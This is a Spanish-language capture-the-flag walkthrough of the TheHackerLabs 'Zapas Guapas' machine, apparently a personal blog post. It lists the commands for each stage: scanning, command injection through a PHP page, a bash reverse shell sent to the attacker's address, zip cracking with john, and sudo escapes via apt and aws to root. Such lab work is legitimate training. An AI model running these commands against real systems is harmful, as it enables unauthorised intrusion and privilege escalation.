---
layout: post
title: "Zapas Guapas"
date: 2024-06-07 15:20:23
category: sample
vm: hackerlabs
---

<style>
  .post-content {
    color: #51c25be1; /* Cambia el color del texto */
  }
</style>

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Zapas Guapas </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://thehackerslabs.com/zapas-guapas/" target="_blank"> Descarga</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/thehackerlabs/Zapasguapas/host.png){:.margin}

**1\.** Identifico el host en la red.

`sudo arp-scan -I enp2s0 --localnet`

![img](/notas/public/img/thehackerlabs/Zapasguapas/arp.png){:.margin}

**2\.** Escaneando puertos y servicios activos del host.

`sudo nmap -p- --open -T5 -sCV --min-rate=5000 -n -Pn 192.168.1.6`

![img](/notas/public/img/thehackerlabs/Zapasguapas/nmap.png){:.margin}

**3\.** Veo una pagina web pero sin mayor importancia.

`http://192.168.1.6`

![img](/notas/public/img/thehackerlabs/Zapasguapas/80.png){:.margin}

**4\.** Fuzzeo recursos en la web.

`gobuster dir -u http//192.168.1.6/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,js -q`

![img](/notas/public/img/thehackerlabs/Zapasguapas/gobuster.png){:.margin}

**5\.** Lo interesante esta en el login, revisando la fuente encuentro un fichero php que ejecuta comandos.

`http://192.168.1.6/login.html`

![img](/notas/public/img/thehackerlabs/Zapasguapas/login.png){:.margin}
![img](/notas/public/img/thehackerlabs/Zapasguapas/logincode.png){:.margin}

**6\.** Me dirijo al fichero con los parametros requeridos y pruebo con un comando.

`http://192.168.1.6/run_command.php?username=&password=id`

![img](/notas/public/img/thehackerlabs/Zapasguapas/runcommand.png){:.margin}

**7\.** Obteniendo una reverse shell.

_7.1- Me pongo en escucha_

`sudo nc -nvlp 443`

![img](/notas/public/img/thehackerlabs/Zapasguapas/nc.png){:.margin}

_7.2- Ingreso el comando para enviar la shell_

`http://192.168.1.6/run_command.php?username=&password=bash -c "bash -i>%26 /dev/tcp/192.168.1.13/443 0>%261"`

![img](/notas/public/img/thehackerlabs/Zapasguapas/bashi.png){:.margin}

_7.3- Recibo la conexion por nc_

![img](/notas/public/img/thehackerlabs/Zapasguapas/ncok.png){:.margin}

**8\.** Encuentro ciertas pistas, y ademas un zip que contiene un password.txt pero esta protegido con una contraseña para descomprimir.

`cat /etc/passwd | grep bash`

`ls /home/test/ /home/proadidas/ /home/pronike/`

`cat /home/proadidas/user.txt /home/pronike/nota.txt`

`ls /opt`

`unzip -l /opt/importante.zip`

`unzip /opt/importante.zip`

![img](/notas/public/img/thehackerlabs/Zapasguapas/look.png){:.margin}

**9\.** Traendo el comprimido a mi maquina local y crackeando la pass.

_9.1- Lo paso a base64_

`base64 -w0 /opt/importante.zip; echo`

![img](/notas/public/img/thehackerlabs/Zapasguapas/base64encode.png){:.margin}

_9.2- Recupero el comprimido en local_

`echo "hash" | base64 -d -w0 > file.zip`

![img](/notas/public/img/thehackerlabs/Zapasguapas/base64decode.png){:.margin}

_9.3- Crackeando la contraseña y descomprimiendo_

`zip2john file.zip > hash`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

`unzip file.zip`

![img](/notas/public/img/thehackerlabs/Zapasguapas/john.png){:.margin}

**10\.** Accedo por ssh con las credenciales indicadas en el archivo.

`cat password.txt`

`ssh pronike@192.168.1.6`

![img](/notas/public/img/thehackerlabs/Zapasguapas/sshpronike.png){:.margin}

**11\.** Veo la nota anterior, y ademas tengo un binario que puedo ejecutar justamente como proadidas.

`cat nota.txt`

`sudo -l`

![img](/notas/public/img/thehackerlabs/Zapasguapas/sudol.png){:.margin}

**12\.** En [gtfobins](https://gtfobins.github.io/gtfobins/apt/#sudo) podemos ver como usar el binario, en este caso saltar a proadidas.

_12.1- Esperamos un poco hasta que salte esta parte_

`sudo -u proadidas apt changelog apt`

![img](/notas/public/img/thehackerlabs/Zapasguapas/aptchangelog.png){:.margin}

_12.2- Me lanzo una bash y ya soy usuario proadidas_

`!/bin/bash`

![img](/notas/public/img/thehackerlabs/Zapasguapas/binbash.png)
![img](/notas/public/img/thehackerlabs/Zapasguapas/binbashok.png)

**13\.** Escalando privilegios.

_13.1- Hay un binario root, otra ves [gtfobins](https://gtfobins.github.io/gtfobins/aws/#sudo)  y ejecuto el binario_

`sudo -l`

`sudo -u root aws help`

![img](/notas/public/img/thehackerlabs/Zapasguapas/sudolproadidas.png){:.margin}

_13.2- Al final ingreso el comando para lanzarme una bash_

`!/bin/bash`

![img](/notas/public/img/thehackerlabs/Zapasguapas/binbashroot.png){:.margin}

_\-> Ya somos root_

![img](/notas/public/img/thehackerlabs/Zapasguapas/root.png){:.margin}

<br>

<span class="finish">_Finalizado._</span>